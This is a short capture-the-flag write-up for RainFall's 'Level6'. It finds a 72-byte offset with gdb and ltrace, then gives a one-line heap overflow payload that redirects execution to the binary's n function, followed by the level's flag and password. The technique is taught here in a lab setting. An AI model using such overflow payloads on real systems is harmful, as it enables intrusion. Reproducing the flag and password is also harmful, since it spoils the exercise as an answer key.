# Level6

## Analysis


## Exploit

```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()

 ❯ python3 offset.py 53
72
```

```
(gdb) info function
All defined functions:
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

```
level6@RainFall:~$ ltrace ./level6 42
__libc_start_main(0x804847c, 2, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                                                = 0x0804a008
malloc(4)                                                                                 = 0x0804a050
strcpy(0x0804a008, "42")                                                                  = 0x0804a008
puts("Nope"Nope
)                                                                              = 5
+++ exited (status 5) +++
```

```
level6@RainFall:~$ ./level6 $(python -c 'print "\x90" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

___

*Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31*